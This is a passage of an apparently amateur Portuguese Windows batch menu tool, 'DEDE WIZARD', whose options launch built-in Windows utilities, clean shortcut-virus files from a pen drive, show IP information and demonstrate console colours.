:PEN DRIVE

          
CLS
time /t
date /t
echo   อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
echo                         PEN DRIVE        
echo   อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ               
color 70
echo  อ           a) LIMPA PEN DRIVER
echo  อ           b) CRIAR AUTORUN
echo  อ           c) COLOCAR PAPEL DE PAREDE
echo  อ           d) CRIAR SISTEMA WIN 7
echo  อ           v) VOLTAR PARA O MENU
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
echo                     DEDE WIZARD                                                                        
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
SET /P OP=Digite sua op็โo? 
if %op% equ a goto a
if %op% equ b goto b
if %op% equ c goto c
if %op% equ d goto d
if %op% equ v goto v
if %op% equ V goto v
if %op% equ f  goto  f
if %op% equ g goto g
if %op% equ h goto h
if %op% equ  i goto  i

echo msgbox"Erro [ %s0% ] nใo ้ um comando veja se a CAPS LOCK estแ ativada",vbcritical,"Desculpe %username% mais isso nใo pode" > %temp%\js03.vbs
start %temp%\js03.vbs
goto PEN DRIVE

:a

@echo off
@echo  

TITLE LIMPA PENDRIVE 
COLOR 9F
ECHO .
ECHO Limpar Pendrive:
ECHO --------------------------------------------------------------------------
ECHO #                                                                         #    
ECHO # Este aquivo limpa Pendrive infectado com o virus Hidden,                #
ECHO # que oculta pasta e arquivos. Siga as instrucoes abaixo                  #
ECHO #                                                                         # 
ECHO #  1 - Acesse o computardor e veja qual a letra da unidade do pendrive    #   
ECHO #                                                                         #
ECHO #  2 - Digite a letra do Pendrive e Aperte a tecla Enter                  #
ECHO #                                                                         #
ECHO ###########################################################################
ECHO .
ECHO Se seu pendrive tiver grande
ECHO capacidade de armazenamento levara mais tempo para elimiar os virus.
ECHO .
SET /p "letra_pendrive=Digite a letra do Pendrive: "
ECHO.
%letra_pendrive%:
ECHO Aguarde. Estamos processando seu Pendrive.
attrib -a -r -h -s -i /d /S
del /f *.lnk
del /f *.ico
del /f x.mpeg
del /f *.src
ECHO .
ECHO .
ECHO .
ECHO ---------------------------------------------------------------------------
ECHO * Recomendamos o criar uma c๓pia de seus arquivos e Formatar seu Pendrive *
ECHO * Fa็a Backup de Seus Arquivos regularmente !!!                           *
ECHO * Finalizamos a limpeza do Pendrive. Tecle Enter para encerrar            *
ECHO *                                                                         
ECHO ---------------------------------------------------------------------------
ECHO .
@echo               

pause


CLS
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
@echo off
color 04
echo:
echo:
echo:           VOLTAR PARA MENU WIZARD
echo:
echo:
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
 choice /C SN /M " VOLTAR AO MENU PRINCIPAL Sim OU NAO "
 IF errorlevel=2 goto NAO
 IF errorlevel=1 goto SIM
 :SIM
cls
goto ultimat
 :NAO
cls
 goto PEN DRIVE


 :b

CLS
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
@echo off
color 04
echo:
echo:
echo:           VOLTAR PARA MENU WIZARD
echo:
echo:
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
 choice /C SN /M " VOLTAR AO MENU PRINCIPAL Sim OU NAO "
 IF errorlevel=2 goto NAO
 IF errorlevel=1 goto SIM
 :SIM
cls
goto ultimat
 :NAO
cls
 goto PEN DRIVE


:c


CLS
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
@echo off
color 04
echo:
echo:
echo:           VOLTAR PARA MENU WIZARD
echo:
echo:
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
 choice /C SN /M " VOLTAR AO MENU PRINCIPAL Sim OU NAO "
 IF errorlevel=2 goto NAO
 IF errorlevel=1 goto SIM
 :SIM
cls
goto ultimat
 :NAO
cls
 goto PEN DRIVE

:d

CLS
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
@echo off
color 04
echo:
echo:
echo:           VOLTAR PARA MENU WIZARD
echo:
echo:
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
 choice /C SN /M " VOLTAR AO MENU PRINCIPAL Sim OU NAO "
 IF errorlevel=2 goto NAO
 IF errorlevel=1 goto SIM
 :SIM
cls
goto ultimat
 :NAO
cls
 goto PEN DRIVE

:v

goto ultimat

 :NAO
cls
 goto PEN DRIVE

::================================= 3 GERENCIADODRES =============================================

echo off
:3 GERENCIADORES

   :GERENCIADORES  

CLS
time /t
date /t
echo   อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
echo:                 GERENCIADORES                
echo   อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ               
color 31
echo  อ           a) gerenciador de tarefas
echo  อ           b) gerenciamento do computador
echo  อ           c) gerenciador de autoriza็ใo
echo  อ           d) gerenciador de verifica็ใo de drive
echo  อ           e) gerenciador de dispositivo
echo  อ            f) 
echo  อ           g)
echo  อ           h)
echo  อ            V) VOLTAR
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
echo:                     DEDE WIZARD                                                                        
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
SET /P OP=Digite sua op็โo? 
if %op% equ a goto a
if %op% equ b goto b
if %op% equ c goto c
if %op% equ d goto d
if %op% equ e goto e
if %op% equ f  goto  f
if %op% equ g goto g
if %op% equ h goto h
if %op% equ  i goto  i
if %op% equ  v goto  v

echo msgbox"Erro [ %s0% ] nใo ้ um comando veja se a CAPS LOCK estแ ativada",vbcritical,"Desculpe %username% mais isso nใo pode" > %temp%\js03.vbs
start %temp%\js03.vbs
goto GERENCIADORES
:a

taskmgr
CLS
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
@echo off
color 04
echo:
echo:
echo:           VOLTAR PARA MENU WIZARD
echo:
echo:
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
 choice /C SN /M " VOLTAR AO MENU PRINCIPAL Sim OU NAO "
 IF errorlevel=2 goto NAO
 IF errorlevel=1 goto SIM
 :SIM
cls
goto ultimat
 :NAO
cls
 goto GERENCIADORES


 :b

CompMgmtLauncher

CLS
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
@echo off
color 04
echo:
echo:
echo:           VOLTAR PARA MENU WIZARD
echo:
echo:
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
 choice /C SN /M " VOLTAR AO MENU PRINCIPAL Sim OU NAO "
 IF errorlevel=2 goto NAO
 IF errorlevel=1 goto SIM
 :SIM
cls
goto ultimat
 :NAO
cls
 goto GERENCIADORES


:c

azman.msc


CLS
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
@echo off
color 04
echo:
echo:
echo:           VOLTAR PARA MENU WIZARD
echo:
echo:
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
 choice /C SN /M " VOLTAR AO MENU PRINCIPAL Sim OU NAO "
 IF errorlevel=2 goto NAO
 IF errorlevel=1 goto SIM
 :SIM
cls
goto ultimat
 :NAO
cls
 goto GERENCIADORES

:d

verifier

CLS
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
@echo off
color 04
echo:
echo:
echo:           VOLTAR PARA MENU WIZARD
echo:
echo:
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
 choice /C SN /M " VOLTAR AO MENU PRINCIPAL Sim OU NAO "
 IF errorlevel=2 goto NAO
 IF errorlevel=1 goto SIM
 :SIM
cls
goto ultimat
 :NAO
cls
 goto GERENCIADORES

:e
devmgmt

CLS
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
@echo off
color 04
echo:
echo:
echo:           VOLTAR PARA MENU WIZARD
echo:
echo:
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
 choice /C SN /M " VOLTAR AO MENU PRINCIPAL Sim OU NAO "
 IF errorlevel=2 goto NAO
 IF errorlevel=1 goto SIM
 :SIM
cls
goto ultimat
 :NAO
cls
 goto GERENCIADORES 

:v
goto ultimat

::====================================== 4 BACKUP  ===============================

echo off
 :4  BKUP  

 :BKUP

CLS
time /t
date /t
echo   อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
echo                       BKUP          
echo   อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ               
color 2f
echo  อ           a) fazer bkup ou restaurar arquivos
echo  อ           b)  bkup de senhas
echo  อ           c) transferencia facil do windows
echo  อ           d) restaura็ใo do sistema
echo  อ           v) VOLTAR
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
echo:                     DEDE WIZARD                                                                        
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
SET /P OP=Digite sua op็โo? 
if %op% equ a goto a
if %op% equ b goto b
if %op% equ c goto c
if %op% equ d goto d
if %op% equ e goto e
if %op% equ f  goto  f
if %op% equ g goto g
if %op% equ h goto h
if %op% equ  i goto  i
if %op% equ  v goto  v

echo msgbox"Erro [ %s0% ] nใo ้ um comando veja se a CAPS LOCK estแ ativada",vbcritical,"Desculpe %username% mais isso nใo pode" > %temp%\js03.vbs
start %temp%\js03.vbs
goto BKUP
:a
sdclt

CLS
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
@echo off
color 04
echo:
echo:
echo:           VOLTAR PARA MENU WIZARD
echo:
echo:
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
 choice /C SN /M " VOLTAR AO MENU PRINCIPAL Sim OU NAO "
 IF errorlevel=2 goto NAO
 IF errorlevel=1 goto SIM
 :SIM
cls
goto ultimat
 :NAO
cls
 goto BKUP


 :b
credwiz

CLS
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
@echo off
color 04
echo:
echo:
echo:           VOLTAR PARA MENU WIZARD
echo:
echo:
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
 choice /C SN /M " VOLTAR AO MENU PRINCIPAL Sim OU NAO "
 IF errorlevel=2 goto NAO
 IF errorlevel=1 goto SIM
 :SIM
cls
goto ultimat
 :NAO
cls
 goto BKUP


:c

start migwiz

CLS
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
@echo off
color 04
echo:
echo:
echo:           VOLTAR PARA MENU WIZARD
echo:
echo:
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
 choice /C SN /M " VOLTAR AO MENU PRINCIPAL Sim OU NAO "
 IF errorlevel=2 goto NAO
 IF errorlevel=1 goto SIM
 :SIM
cls
goto ultimat
 :NAO
cls
 goto BKUP

:d
rstrui

CLS
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
@echo off
color 04
echo:
echo:
echo:           VOLTAR PARA MENU WIZARD
echo:
echo:
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
 choice /C SN /M " VOLTAR AO MENU PRINCIPAL Sim OU NAO "
 IF errorlevel=2 goto NAO
 IF errorlevel=1 goto SIM
 :SIM
cls
goto ultimat
 :NAO
cls
 goto BKUP

:e

CLS
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
@echo off
color 04
echo:
echo:
echo:           VOLTAR PARA MENU WIZARD
echo:
echo:
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
 choice /C SN /M " VOLTAR AO MENU PRINCIPAL Sim OU NAO "
 IF errorlevel=2 goto NAO
 IF errorlevel=1 goto SIM
 :SIM
cls
goto ultimat
 :NAO
cls
 goto BKUP      

:v
goto ultimat

::=================================== 5 INTERNET =================================

echo off
:5 INTERNET

  : INTERNET  

CLS
color 1f
time /t
date /t
echo   อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
echo:                      INTERNET           
echo   อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ               
color 1f
echo  อ           a) adiconar hardware
echo  อ           b) assistencia remota
echo  อ           c) conexใo remota
echo  อ           d) conectar a um progeto de rede
echo  อ           e) endere็o de servidor
echo  อ           f) conectar ao computador remoto
echo  อ           g) ip ultimate
echo  อ           v) voltar para o menu
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
echo:                     DEDE WIZARD                                                                        
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
SET /P OP=Digite sua op็โo? 
if %op% equ a goto a
if %op% equ b goto b
if %op% equ c goto c
if %op% equ d goto d
if %op% equ e goto e
if %op% equ f  goto  f
if %op% equ g goto ip
if %op% equ h goto h
if %op% equ  i goto i
if %op% equ  v goto v
if %op% equ  V goto v
echo msgbox"Erro [ %s0% ] nใo ้ um comando veja se a CAPS LOCK estแ ativada",vbcritical,"Desculpe %username% mais isso nใo pode" > %temp%\js03.vbs
start %temp%\js03.vbs
goto INTERNET

:a
hdwwiz

CLS
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
@echo off
color 04
echo:
echo:
echo:           VOLTAR PARA MENU WIZARD
echo:
echo:
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
 choice /C SN /M " VOLTAR AO MENU PRINCIPAL Sim OU NAO "
 IF errorlevel=2 goto NAO
 IF errorlevel=1 goto SIM
 :SIM
cls
goto ultimat
 :NAO
cls
 goto INTERNET


 :b
msra

CLS
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
@echo off
color 04
echo:
echo:
echo:           VOLTAR PARA MENU WIZARD
echo:
echo:
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
 choice /C SN /M " VOLTAR AO MENU PRINCIPAL Sim OU NAO "
 IF errorlevel=2 goto NAO
 IF errorlevel=1 goto SIM
 :SIM
cls
goto ultimat
 :NAO
cls
 goto INTERNET


:c
mstsc


CLS
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
@echo off
color 04
echo:
echo:
echo:           VOLTAR PARA MENU WIZARD
echo:
echo:
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
 choice /C SN /M " VOLTAR AO MENU PRINCIPAL Sim OU NAO "
 IF errorlevel=2 goto NAO
 IF errorlevel=1 goto SIM
 :SIM
cls
goto ultimat
 :NAO
cls
 goto INTERNET

:d
NetProj

CLS
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
@echo off
color 04
echo:
echo:
echo:           VOLTAR PARA MENU WIZARD
echo:
echo:
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
 choice /C SN /M " VOLTAR AO MENU PRINCIPAL Sim OU NAO "
 IF errorlevel=2 goto NAO
 IF errorlevel=1 goto SIM
 :SIM
cls
goto ultimat
 :NAO
cls
 goto INTERNET

:e
nslookup

CLS
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
@echo off
color 04
echo:
echo:
echo:           VOLTAR PARA MENU WIZARD
echo:
echo:
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
 choice /C SN /M " VOLTAR AO MENU PRINCIPAL Sim OU NAO "
 IF errorlevel=2 goto NAO
 IF errorlevel=1 goto SIM
 :SIM
cls
goto ultimat
 :NAO
cls
 goto INTERNET

:f
TpmInit

CLS
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
@echo off
color 04
echo:
echo:
echo:           VOLTAR PARA MENU WIZARD
echo:
echo:
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
 choice /C SN /M " VOLTAR AO MENU PRINCIPAL Sim OU NAO "
 IF errorlevel=2 goto NAO
 IF errorlevel=1 goto SIM
 :SIM
cls
goto ultimat
 :NAO
cls
 goto INTERNET

:ip
cls
 @echo off
        title 10 Formas De Olhas O Ip
        :inicio
        color fc
        echo 1: IPCONFIG
        ping -n 3 localhost>nul
        ipconfig
        echo.
        echo 2: ARP
        ping -n 3 localhost>nul
        arp -a
        echo.
        echo 3: ROUTE PRINT
        ping -n 3 localhost>nul
        route print
        echo.
        echo 4: NETSTAT
        ping -n 3 localhost>nul
        netstat -r
        echo.
        echo 5:NSLOOKUP
        ping -n 3 localhost>nul
        nslookup %computername% 2
        echo.
        echo 6: NETSH DIAG SHOW IP
        ping -n 3 localhost>nul
        netsh diag show ip
        echo.
        echo 7: SYSTEMINFO
        ping -n 3 localhost>nul
        systeminfo
        echo.
        echo 8: WMIC NICCONFIG GET IPADDERSS
        ping -n 3 localhost>nul
        WMIC NICCONFIG GET IPADDERSS
        echo.
        echo 9: PING
        ping -n 3 locahost>nul
        ping %computername%
        echo.
        echo 10: TRACERT
        ping -n 3 localhost>nul
        tracert %computername%
 MSG *" adapta็ใo dede wizard"
        pause >nul
       

CLS
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
@echo off
color 04
echo:
echo:
echo:           VOLTAR PARA MENU WIZARD
echo:
echo:
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
 choice /C SN /M " VOLTAR AO MENU PRINCIPAL Sim OU NAO "
 IF errorlevel=2 goto NAO
 IF errorlevel=1 goto SIM
 :SIM
cls
goto ultimat
 :NAO
cls
 goto INTERNET



:v
goto ultimat

::======================================== 6 LIMPESA  ============================

echo off
 :6 LIMPESA 

  : LIMPESA  


CLS
time /t
date /t
echo   อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
echo                      LIMPESA           
echo   อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ               
color 1f
echo  อ           a) desfragmentador
echo  อ           b) limpesa de disco
echo  อ           c) temp 1 , 2 e prefetch
echo  อ           d) 
echo  อ           v) voltar para o menu
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
echo:                     DEDE WIZARD                                                                        
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
SET /P OP=Digite sua op็โo? 
if %op% equ a goto a
if %op% equ b goto b
if %op% equ c goto c
if %op% equ d goto d
if %op% equ e goto e
if %op% equ f  goto  f
if %op% equ g goto g
if %op% equ v goto v
echo msgbox"Erro [ %s0% ] nใo ้ um comando veja se a CAPS LOCK estแ ativada",vbcritical,"Desculpe %username% mais isso nใo pode" > %temp%\js03.vbs
start %temp%\js03.vbs
goto LIMPESA 


:a
dfrgui

CLS
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
@echo off
color 04
echo:
echo:
echo:           VOLTAR PARA MENU WIZARD
echo:
echo:
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
 choice /C SN /M " VOLTAR AO MENU PRINCIPAL Sim OU NAO "
 IF errorlevel=2 goto NAO
 IF errorlevel=1 goto SIM
 :SIM
cls
goto ultimat
 :NAO
cls
 goto LIMPESA


 :b
cleanmgr

CLS
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
@echo off
color 04
echo:
echo:
echo:           VOLTAR PARA MENU WIZARD
echo:
echo:
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
 choice /C SN /M " VOLTAR AO MENU PRINCIPAL Sim OU NAO "
 IF errorlevel=2 goto NAO
 IF errorlevel=1 goto SIM
 :SIM
cls
goto ultimat
 :NAO
cls
 goto LIMPESA


:c
start temp
start %temp%
start prefetch
CLS
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
@echo off
color 04
echo:
echo:
echo:           VOLTAR PARA MENU WIZARD
echo:
echo:
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
 choice /C SN /M " VOLTAR AO MENU PRINCIPAL Sim OU NAO "
 IF errorlevel=2 goto NAO
 IF errorlevel=1 goto SIM
 :SIM
cls
goto ultimat
 :NAO
cls
 goto LIMPESA

:d

CLS
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
@echo off
color 04
echo:
echo:
echo:           VOLTAR PARA MENU WIZARD
echo:
echo:
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
 choice /C SN /M " VOLTAR AO MENU PRINCIPAL Sim OU NAO "
 IF errorlevel=2 goto NAO
 IF errorlevel=1 goto SIM
 :SIM
cls
goto ultimat
 :NAO
cls
 goto LIMPESA

:e

CLS
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
@echo off
color 04
echo:
echo:
echo:           VOLTAR PARA MENU WIZARD
echo:
echo:
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
 choice /C SN /M " VOLTAR AO MENU PRINCIPAL Sim OU NAO "
 IF errorlevel=2 goto NAO
 IF errorlevel=1 goto SIM
 :SIM
cls
goto ultimat
 :NAO
cls
 goto LIMPESA

:v
goto ultimat
::===================================  7 APLICATIVOS ============================

echo off
:7 APLICATIVOS    

 :APLICATIVOS  

CLS
time /t
date /t
echo   อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
echo                  7   APLICATIVOS            
echo   อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ               
color 0A
echo  อ           a)  sons
echo  อ           b)  mapa de caracteres
echo  อ           c)  clear tipe
echo  อ           d)  calibragen de cores
echo  อ           e)  displei
echo  อ           f)  editor de caracteres
echo  อ           g)  editor de folha de rosto de fax
echo  อ           h)  paint
echo  อ           i)  bloco de nota
echo  อ           j)  teclado virtual
echo  อ           k)  fotografa a area de trabalho
echo  อ           l)  notas auto adesivas
echo  อ           m)  textos  word
echo  อ            
echo  อ           v) voltar para o menu
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
echo:                     DEDE WIZARD                                                                        
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
SET /P OP=Digite sua op็โo? 
if %op% equ a goto a
if %op% equ b goto b
if %op% equ c goto c
if %op% equ d goto d
if %op% equ e goto e
if %op% equ f goto f
if %op% equ g goto g

if %op% equ h goto h
if %op% equ  i goto  i
if %op% equ  v goto  v

echo msgbox"Erro [ %s0% ] nใo ้ um comando veja se a CAPS LOCK estแ ativada",vbcritical,"Desculpe %username% mais isso nใo pode" > %temp%\js03.vbs
start %temp%\js03.vbs
goto APLICATIVOS
:a
sons
:sons

:b
charmap.exe
:c
cttune
:d
dccw
:e
DisplaySwitch
:f
 eudcedit
:g
FXSCOVER
WFS
:h
mspaint
:i
notepad
:j
osk
:k
SnippingTool
:l
StikyNot
:m
write
:v
goto ultimat
::================================= 7b SONS   =================================

echo off
:a

:sons

CLS
time /t
date /t
echo   อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
echo                     SONS            
echo   อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ               
color f2
echo  อ           a) GRAVADOR 1 
echo  อ           b) GRAVADOR 2
echo  อ           c) VOLUME
echo  อ           d) 
echo  อ           v) voltar para o menu 
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
echo:                     DEDE WIZARD                                                                        
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
SET /P OP=Digite sua op็โo? 
if %op% equ a goto a
if %op% equ b goto b
if %op% equ c goto c
if %op% equ d goto d
if %op% equ e goto e
if %op% equ f  goto  f
if %op% equ g goto g
if %op% equ v goto v
if %op% equ  V goto  v

echo msgbox"Erro [ %s0% ] nใo ้ um comando veja se a CAPS LOCK estแ ativada",vbcritical,"Desculpe %username% mais isso nใo pode" > %temp%\js03.vbs
start %temp%\js03.vbs
goto sons
:a
SoundRecorder
CLS
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
@echo off
color 04
echo:
echo:
echo:           VOLTAR PARA MENU APLICATIVOS
echo:
echo:
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
 choice /C SNM /M " VOLTAR AO MENU PRINCIPAL Sim OU NAO "
 IF errorlevel=2 goto NAO
 IF errorlevel=1 goto SIM
 :SIM
cls
goto APLICATIVOS
 :NAO
cls
 goto SONS
:M
goto ultimat

 :b

psr

CLS
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
@echo off
color 04
echo:
echo:
echo:           VOLTAR PARA MENU WIZARD
echo:
echo:
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
echo [m] volta para o menu principal
 choice /C SNM /M " VOLTAR AO MENU PRINCIPAL Sim OU NAO "
 IF errorlevel=2 goto NAO
 IF errorlevel=1 goto SIM   
 :SIM
cls
goto  APLICATIVOS
 :NAO
cls
 goto SONS
:M
goto ultimat


:c
SndVol

CLS
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
@echo off
color 04
echo:
echo:
echo:           VOLTAR PARA MENU APLICATIVOS
echo:
echo:
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
 choice /C SNM /M " VOLTAR AO MENU PRINCIPAL Sim OU NAO "
 IF errorlevel=2 goto NAO
 IF errorlevel=1 goto SIM
 :SIM
cls
goto APLICATIVOS
 :NAO
cls
 goto SONS
:M
goto ultimat
:d

CLS
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
@echo off
color 04
echo:
echo:
echo:           VOLTAR PARA MENU APLICATIVOS
echo:
echo:
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
 choice /C SNM /M " VOLTAR AO MENU PRINCIPAL Sim OU NAO "
 IF errorlevel=2 goto NAO
 IF errorlevel=1 goto SIM
 :SIM
cls
goto APLICATIVOS
 :NAO
cls
 goto SONS
:M
goto ultimat

:e

CLS
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
@echo off
color 04
echo:
echo:
echo:           VOLTAR PARA MENU APLICATIVOS
echo:
echo:
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
 choice /C SNM /M " VOLTAR AO MENU PRINCIPAL Sim OU NAO "
 IF errorlevel=2 goto NAO
 IF errorlevel=1 goto SIM
 :SIM
cls
goto APLICATIVOS
 :NAO
cls
 goto SONS
:v
goto ultimat

::===================================== 8  CORES ================================

echo off
  :8   CORES

  :CORES   

CLS
time /t
date /t
echo   อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
echo:                       CORES          
echo   อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ               
color f0
echo  อ           a) ver cores
echo  อ           b) 
echo  อ           c) 
echo  อ           d) 
echo  อ           v) voltar para o menu 
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
echo:                     DEDE WIZARD                                                                        
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
SET /P OP=Digite sua op็โo? 
if %op% equ a goto a
if %op% equ b goto b
if %op% equ c goto c
if %op% equ d goto d
if %op% equ e goto e
if %op% equ f  goto  f
if %op% equ g goto g
if %op% equ v goto v

echo msgbox"Erro [ %s0% ] nใo ้ um comando veja se a CAPS LOCK estแ ativada",vbcritical,"Desculpe %username% mais isso nใo pode" > %temp%\js03.vbs
start %temp%\js03.vbs
goto CORES


:a
Echo off
cls
color 1f
title    ## cores do pronpt de comando ##

time /t
date /t     
echo:    
echo    0 = Preto      
echo    1 = Azul         
echo    2 = Verde        
echo    3 = Verde-แgua   
echo    4 = Vermelho     
echo    5 = Roxo         
echo    6 = Amarelo      
echo    7 = Branco 
echo    8 = Cinza  
echo    9 = Azul claro 
echo    A = Verde claro
echo    B = Verde-แgua claro 
echo    C = Vermelho claro  
echo    D = Lilแs
echo    E = Amarelo claro
echo    F = Branco brilhante
echo:           
echo:
echo      fundo azul letras aleat๓rias
color 1a             
pause
color 1b
pause
color 1c
pause 
color 1d
pause
 color 1e
pause
color 1f
pause
color 10
pause
color 11
pause
color 12
pause
color 13
pause
color 14
pause
color 15
pause
color 16
pause
color 17
pause
color 18
pause
color 19
pause          
echo:
echo        letra branca fundo de cores aleat๓rias
echo:
color 07
pause
color 17
pause
color  27
pause
color 37
pause
color 47
pause
color 57
pause
color 67
pause
color 77
pause
color 87
pause
color 97
pause 
color a7
pause
color b7
pause
color c7
pause
color d7
pause
color e7
pause
color f7 
pause

CLS
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
@echo off
color 04
echo:
echo:
echo:           VOLTAR PARA MENU WIZARD
echo:
echo:
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
 choice /C SN /M " VOLTAR AO MENU PRINCIPAL Sim OU NAO "
 IF errorlevel=2 goto NAO
 IF errorlevel=1 goto SIM
 :SIM
cls
goto ultimat
 :NAO
cls
 goto CORES


 :b

CLS
